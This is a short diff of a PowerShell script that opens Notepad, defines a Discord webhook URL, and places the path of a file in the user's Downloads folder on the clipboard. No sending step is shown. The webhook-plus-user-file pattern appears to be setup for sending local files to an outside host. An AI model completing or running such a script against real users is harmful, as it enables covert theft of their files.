@@ -1,7 +1,7 @@
 Start-Process 'C:\windows\system32\notepad.exe'
 
 $wh = "https://discord.com/api/webhooks/$wh"
-$path = "$Env:USERPROFILE:\Downloads\test.txt"
+$path = "$env:USERPROFILE\Downloads\test.txt"
 
 Set-Clipboard -Value "$path"
 
